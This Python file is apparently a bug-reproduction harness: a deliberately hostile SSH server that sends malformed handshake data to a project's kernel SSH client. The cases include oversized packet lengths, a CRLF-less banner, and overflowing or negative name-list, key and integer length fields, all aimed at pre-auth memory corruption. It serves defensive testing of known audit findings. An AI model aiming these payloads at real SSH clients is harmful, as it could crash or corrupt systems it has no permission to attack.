#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 cubestudio-dev <cubestudio@qq.com>
"""P0fix1 hostile SSH server -- reproduction harness for BUG-0007..BUG-0013
(kernel SSH client pre-auth memory corruption, audit findings A14-01..A14-07).

One hostile behaviour per case, selected with --case. Each case opens a TCP
listener the kernel `ssh` client connects to (QEMU slirp: guest reaches the
host at 10.0.2.2). Only plain-socket flows are implemented here; the
post-NEWKEYS encrypted case (A14-07) uses paramiko -- see case a07_enc.

Cases
  a01_pkt35000   A14-01  packet_length=35000 read into one 4096B page
  a02_banner300  A14-02  300-byte banner (no CRLF) into server_banner[64]
  a03_ql         A14-03  KEXINIT name-list length 0x7FFFFFF0 (q+L overflow)
  a04_kslen_neg  A14-04  KEX_ECDH_REPLY ks_len = 0x80000000 (negative)
  a05_flen_neg   A14-05  group14 KEXDH_REPLY f_len = 0x80000010 (negative)
  a06_hashH      A14-06  ~3.4KB KEXINIT name-list -> exchange-hash page overflow
  a07_enc        A14-07  (paramiko) post-NEWKEYS 30000B encrypted packet
"""
import argparse
import socket
import struct
import sys
import threading
import time


def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        d = conn.recv(n - len(buf))
        if not d:
            break
        buf += d
    return buf


def recv_banner(conn):
    """Read one SSH version banner line."""
    buf = b""
    while b"\r\n" not in buf and len(buf) < 512:
        d = conn.recv(1)
        if not d:
            break
        buf += d
    return buf


def namelist(payload_list):
    b = b""
    for s in payload_list:
        b += struct.pack(">I", len(s)) + s
    return b


def kexinit_packet(kex_names, extra_pad=0):
    """Build a plain (unencrypted) SSH_MSG_KEXINIT packet.

    NOTE: the cookie must not be all-zero bytes -- an all-zero cookie is
    mangled by the kernel TCP receive path (separate networking bug, not
    part of the P0 batch), which desynchronises the client parser."""
    payload = b"\x14" + b"\x11" * 16 + namelist(kex_names) + \
        namelist([b"ssh-rsa"]) + namelist([b"aes128-ctr"]) + \
        namelist([b"aes128-ctr"]) + namelist([b"hmac-sha2-256"]) + \
        namelist([b"hmac-sha2-256"]) + namelist([b"none"]) + \
        namelist([b"none"]) + namelist([b""]) + namelist([b""]) + \
        b"\x00" + struct.pack(">I", 0)
    if extra_pad:
        payload = payload + b"\x00" * extra_pad
    pad = 8 - ((4 + 1 + len(payload)) % 8)
    if pad < 4:
        pad += 8
    pkt_len = 1 + len(payload) + pad
    return struct.pack(">I", pkt_len) + bytes([pad]) + payload + b"\x00" * pad


def read_packet(conn):
    hdr = recv_exact(conn, 4)
    if len(hdr) < 4:
        return None
    (pkt_len,) = struct.unpack(">I", hdr)
    body = recv_exact(conn, pkt_len)
    if len(body) < pkt_len:
        return None
    pad = body[0]
    return body[1:pkt_len - pad]


def send_packet(conn, payload):
    pad = 8 - ((4 + 1 + len(payload)) % 8)
    if pad < 4:
        pad += 8
    pkt_len = 1 + len(payload) + pad
    conn.sendall(struct.pack(">I", pkt_len) + bytes([pad]) + payload + b"\x00" * pad)


def case_a01_pkt35000(conn):
    """Banner exchange, then declare a 35000-byte packet (A14-01)."""
    conn.sendall(b"SSH-2.0-EVIL_a01\r\n")
    recv_banner(conn)
    read_packet(conn)          # client KEXINIT
    # Malicious: packet_length = 35000 followed by 35000 junk bytes.
    conn.sendall(struct.pack(">I", 35000))
    try:
        conn.sendall(b"A" * 35000)
    except BrokenPipeError:
        pass


def case_a02_banner300(conn):
    """Send 300 banner bytes with no CRLF (A14-02)."""
    conn.sendall(b"A" * 300)
    time.sleep(3)


def case_a03_ql(conn):
    """KEXINIT whose first name-list length is 0x7FFFFFF0 (A14-03)."""
    conn.sendall(b"SSH-2.0-EVIL_a03\r\n")
    recv_banner(conn)
    read_packet(conn)          # client KEXINIT
    payload = b"\x14" + b"\x11" * 16 + struct.pack(">I", 0x7FFFFFF0) + \
        b"curve25519-sha256" + namelist([b"ssh-rsa"]) + \
        namelist([b"aes128-ctr"]) * 2 + namelist([b"hmac-sha2-256"]) * 2 + \
        namelist([b"none"]) * 2 + namelist([b""]) * 2 + b"\x00" + struct.pack(">I", 0)
    send_packet(conn, payload)
    time.sleep(3)


def _kex_reply(ks_len=None, f_len=None, kex_curve=True):
    """KEXDH_REPLY payload with optionally hostile length fields."""
    host_key = b"\x00" * 4 + b"ssh-rsa" + b"\x01\x00\x01" + b"\x11" * 256
    if ks_len is None:
        ks_field = struct.pack(">I", len(host_key)) + host_key
    else:
        ks_field = struct.pack(">I", ks_len)   # length only (lies about body)
    f_body = b"\x00" + b"\xf0" * 32
    if f_len is None:
        f_field = struct.pack(">I", len(f_body)) + f_body
    else:
        f_field = struct.pack(">I", f_len) + f_body
    sig = struct.pack(">I", 8) + b"SIGDATA\x00"
    msg = b"\x1f" if kex_curve else b"\x1f"
    return msg + ks_field + f_field + sig


def case_a04_kslen_neg(conn):
    """Full KEXINIT exchange, then KEX_ECDH_REPLY with ks_len=0x80000000 (A14-04)."""
    conn.sendall(b"SSH-2.0-EVIL_a04\r\n")
    recv_banner(conn)
    read_packet(conn)                                    # client KEXINIT
    conn.sendall(kexinit_packet([b"curve25519-sha256"]))
    read_packet(conn)                                    # client KEX_ECDH_INIT (30)
    send_packet(conn, _kex_reply(ks_len=0x80000000))     # hostile
    time.sleep(3)


def case_a05_flen_neg(conn):
    """Server offers only group14; KEXDH_REPLY with f_len=0x80000010 (A14-05)."""
    conn.sendall(b"SSH-2.0-EVIL_a05\r\n")
    recv_banner(conn)
    read_packet(conn)                                    # client KEXINIT
    conn.sendall(kexinit_packet([b"diffie-hellman-group14-sha256"]))
    # group14 path: client computes 2048-bit modexp (~60s), wait for INIT
    conn.settimeout(180)
    read_packet(conn)                                    # client KEXDH_INIT (30)
    send_packet(conn, _kex_reply(f_len=0x80000010))      # hostile
    time.sleep(3)


def case_a06_hashH(conn):
    """Big but parseable KEXINIT (~3.4KB name-list) -> exchange-hash page overflow (A14-06)."""
    conn.sendall(b"SSH-2.0-EVIL_a06\r\n")
    recv_banner(conn)
    read_packet(conn)                                    # client KEXINIT
    # name-list that still contains the supported name but is huge
    big = b"curve25519-sha256" + b"," + b"x" * 3300
    conn.sendall(kexinit_packet([big]))
    read_packet(conn)                                    # client KEX_ECDH_INIT
    send_packet(conn, _kex_reply())                      # structurally valid reply
    time.sleep(5)


def case_a07_enc(conn, *a):
    """Placeholder: A14-07 needs a real key exchange; handled by paramiko
    runner (tools/p0_evil_sshd_client.py --mode paramiko --case a12_enc and
    the symmetric server-side case in p0_paramiko_evil.py)."""
    conn.close()


CASES = {
    "a01_pkt35000": case_a01_pkt35000,
    "a02_banner300": case_a02_banner300,
    "a03_ql": case_a03_ql,
    "a04_kslen_neg": case_a04_kslen_neg,
    "a05_flen_neg": case_a05_flen_neg,
    "a06_hashH": case_a06_hashH,
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--case", required=True, choices=sorted(CASES))
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--once", action="store_true", default=True)
    args = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", args.port))
    srv.listen(1)
    print(f"[evil-server] case={args.case} listening on 127.0.0.1:{args.port}", flush=True)
    srv.settimeout(120)
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print("[evil-server] no connection within 120s", flush=True)
        return 2
    print(f"[evil-server] connection from {addr}", flush=True)
    conn.settimeout(120)
    try:
        CASES[args.case](conn)
        print(f"[evil-server] case {args.case} payload sent", flush=True)
    except Exception as e:  # noqa
        print(f"[evil-server] case {args.case} exception: {e!r}", flush=True)
        return 1
    finally:
        try:
            conn.close()
        except Exception:  # noqa
            pass
        srv.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
